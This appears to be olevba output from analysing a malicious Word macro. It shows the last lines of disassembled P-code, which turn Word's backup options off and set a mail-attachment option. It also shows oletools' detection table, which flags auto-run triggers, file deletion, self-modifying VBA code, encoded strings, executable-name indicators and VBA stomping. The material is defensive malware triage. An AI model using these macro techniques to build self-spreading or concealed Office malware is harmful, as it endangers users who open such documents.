' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt BackgroundSave 
' Line #248:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt CreateBackup 
' Line #249:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SendMailAttach 
' Line #250:
' 	Label Jackal 
' Line #251:
' 	EndSub 
' Macros/VBA/UserForm - 1142 bytes
' Line #0:
' Line #1:
' Line #2:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Scan32.dll          |Executable file name                         |
|IOC       |macro.exe           |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

